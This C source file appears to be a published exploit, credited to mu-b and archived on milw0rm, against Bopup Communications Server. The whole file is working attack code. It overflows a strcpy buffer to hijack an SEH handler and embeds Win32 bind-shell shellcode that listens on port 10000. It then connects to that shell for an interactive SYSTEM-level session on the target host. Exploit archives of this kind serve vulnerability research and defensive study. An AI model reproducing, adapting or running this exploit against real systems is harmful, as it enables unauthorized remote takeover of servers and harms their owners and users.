/* bopup-down.c
 *
 * Copyright (c) 2008 by <mu-b@digit-labs.org>
 *
 * Bopup Communications Server remote SYSTEM exploit
 * by mu-b - Sat Feb 08 2008
 *
 * - Tested on: Bopup Communications Server 3.2.26.5460 (Mar 18 2009)
 *
 * .text:00407A17 lea     eax, [ebp+pkt_0x19]
 * .text:00407A1D push    eax
 * .text:00407A1E lea     eax, [ebp+var_354]
 * .text:00407A24 push    eax
 * .text:00407A25 call    _strcpy
 *
 * note: this is updated over time for newer versions, I can't be bothered
 *       making it universal nor anything else...
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2008!@$!
 */

#include <stdio.h>
#include <stdlib.h>

#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
#include <unistd.h>

#define BUF_SIZE          2048
#define BOPUP_STR_OFFSET  0x19
#define BOPUP_STR_LEN     0x348+8

#define BOPUP_POPRET      0x00401DD5

#define NOP               0x41
#define PAD               0xCC

#define DEF_PORT          19810
#define PORT_BOPUP        DEF_PORT
#define PORT_SHELL        10000

static char win32_x86_bind[] =
  "\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45"
  "\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49"
  "\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d"
  "\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66"
  "\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61"
  "\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40"
  "\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32"
  "\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6"
  "\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09"
  "\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0"
  "\x66\x68\x27\x10\x66\x53\x89\xe1\x95\x68\xa4\x1a\x70\xc7\x57\xff"
  "\xd6\x6a\x10\x51\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53"
  "\x55\xff\xd0\x68\xe5\x49\x86\x49\x57\xff\xd6\x50\x54\x54\x55\xff"
  "\xd0\x93\x68\xe7\x79\xc6\x79\x57\xff\xd6\x55\xff\xd0\x66\x6a\x64"
  "\x66\x68\x63\x6d\x89\xe5\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89"
  "\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93\x8d\x7a\x38\xab"
  "\xab\xab\x68\x72\xfe\xb3\x16\xff\x75\x44\xff\xd6\x5b\x57\x52\x51"
  "\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53"
  "\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83\xc4\x64\xff\xd6"
  "\x52\xff\xd0\x68\xef\xce\xe0\x60\x53\xff\xd6\xff\xd0";

static int
sock_send (int fd, char *src, int len)
{
  int n;
  if ((n = send (fd, src, len, 0)) < 0)
    {
      fprintf (stderr, "sock_send: send() - %s\n", strerror (errno));
      exit (EXIT_FAILURE);
    }

  return (n);
}

static int
sock_recv (int fd, char *dst, int len)
{
  int n;
  if ((n = recv (fd, dst, len, 0)) < 0)
    {
      fprintf (stderr, "sock_recv: recv() - %s\n", strerror (errno));
      exit (EXIT_FAILURE);
    }

  return (n);
}

static void
shellami (int fd)
{
  int n;
  fd_set rset;
  char rbuf[1024];

  while (1)
    {
      FD_ZERO (&rset);
      FD_SET (fd, &rset);
      FD_SET (STDIN_FILENO, &rset);

      if (select (fd + 1, &rset, NULL, NULL, NULL) < 0)
        {
          fprintf (stderr, "shellami: select() - %s\n", strerror (errno));
          exit (EXIT_FAILURE);
        }

      if (FD_ISSET (fd, &rset))
        {
          if ((n = sock_recv (fd, rbuf, sizeof (rbuf) - 1)) <= 0)
            {
              fprintf (stderr, "shellami: connection closed by foreign host.\n");
              exit (EXIT_SUCCESS);
            }
          rbuf[n] = '\0';
          printf ("%s", rbuf);
          fflush (stdout);
        }
      if (FD_ISSET (STDIN_FILENO, &rset))
        {
          if ((n = read (STDIN_FILENO, rbuf, sizeof (rbuf) - 1)) > 0)
            {
              rbuf[n] = '\0';
              sock_send (fd, rbuf, n);
            }
        }
    }
}

static int
sockami (char *host, int port)
{
  struct sockaddr_in address;
  struct hostent *hp;
  int fd;

  if ((fd = socket (AF_INET, SOCK_STREAM, 0)) == -1)
    {
      fprintf (stderr, "sockami: socket() - %s\n", strerror (errno));
      exit (EXIT_FAILURE);
    }

  if ((hp = gethostbyname (host)) == NULL)
    {
      fprintf (stderr, "sockami: gethostbyname() - %s\n", strerror (errno));
      exit (EXIT_FAILURE);
    }

  memset (&address, 0, sizeof (address));
  memcpy ((char *) &address.sin_addr, hp->h_addr, hp->h_length);
  address.sin_family = AF_INET;
  address.sin_port = htons (port);

  if (connect (fd, (struct sockaddr *) &address, sizeof (address)) < 0)
    {
      fprintf (stderr, "sockami: connect() - %s\n", strerror (errno));
      return (-1);
    }

  return (fd);
}

static void
zbuffami (char *zbuf)
{
  char *ptr, *j_ptr;

  ptr = zbuf;
  memcpy (ptr, "\x01\x00\x00\x00", sizeof (int));
  memset (ptr + sizeof (int), PAD, BOPUP_STR_OFFSET - sizeof (int));
  memset (ptr + BOPUP_STR_OFFSET, NOP, BOPUP_STR_LEN);

  ptr += BOPUP_STR_OFFSET + BOPUP_STR_LEN - 8;
  j_ptr = ptr - 32;
  memcpy (j_ptr - (sizeof (win32_x86_bind)) + 1, win32_x86_bind,
          sizeof (win32_x86_bind) - 1);

  *j_ptr++ = '\xe9';
  *j_ptr++ = (-(sizeof (win32_x86_bind) - 1 + 5) & 0x000000ff);
  *j_ptr++ = (-(sizeof (win32_x86_bind) - 1 + 5) & 0x0000ff00) >> 8;
  *j_ptr++ = (-(sizeof (win32_x86_bind) - 1 + 5) & 0x00ff0000) >> 16;
  *j_ptr++ = (-(sizeof (win32_x86_bind) - 1 + 5) & 0xff000000) >> 24;

  *ptr++ = '\xeb';
  *ptr++ = '\xde';
  *ptr++ = 0x90;
  *ptr++ = 0x90;
  *(unsigned int *) ptr = BOPUP_POPRET;
}

int
main (int argc, char **argv)
{
  char zbuf[BUF_SIZE];
  int fd, n;

  printf ("Bopup Communications Server remote SYSTEM exploit\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n");

  if (argc <= 1)
    {
      fprintf (stderr, "Usage: %s <host>\n", argv[0]);
      exit (EXIT_SUCCESS);
    }

  fd = sockami (argv[1], PORT_BOPUP);
  if (fd == -1)
    {
      fprintf (stderr, "%s: sockami failed\n", argv[0]);
      exit (EXIT_FAILURE);
    }

  printf ("* connected to %s:%d\n\n", argv[1], PORT_BOPUP);

  printf ("** SEH offset @+%04X\n", BOPUP_STR_OFFSET + BOPUP_STR_LEN - 8);
  printf ("** return addy @0x%08X\n\n", BOPUP_POPRET);

  printf ("* building buffer with shellcode...");
  zbuffami (zbuf);
  printf ("done\n");

  printf ("* sending request...");
  if ((n = sock_send (fd, zbuf, BOPUP_STR_OFFSET + BOPUP_STR_LEN)) != BOPUP_STR_OFFSET + BOPUP_STR_LEN)
    {
      fprintf (stderr, "%s: sock_send returned %d (!= %d)\n",
               argv[0], n, BOPUP_STR_OFFSET + BOPUP_STR_LEN);
      exit (EXIT_FAILURE);
    }
  printf ("done\n");
  close (fd);

  printf ("* waiting for the shellcode to be executed...\n");
  sleep (2);

  if ((fd = sockami (argv[1], PORT_SHELL)) != -1)
    {
      printf ("+Wh00t!\n\n");
      shellami (fd);
    }

  return (EXIT_SUCCESS);
}

// milw0rm.com [2009-06-22]
